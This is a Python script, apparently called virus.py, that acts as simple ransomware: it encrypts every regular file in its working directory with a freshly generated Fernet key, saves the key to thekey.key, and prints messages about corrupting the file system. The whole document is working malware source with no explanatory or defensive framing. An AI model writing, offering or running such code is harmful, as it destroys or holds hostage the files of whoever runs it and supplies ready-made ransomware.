#!/usr/bin/env python
import os
from time import sleep
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
    if file == "virus.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

print(files)
print("Corrupting the file systems.....")

sleep(5)

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open (file,"wb") as thefile:
        thefile.write(contents_encrypted)
        sleep(3)
        print("File System corrupted")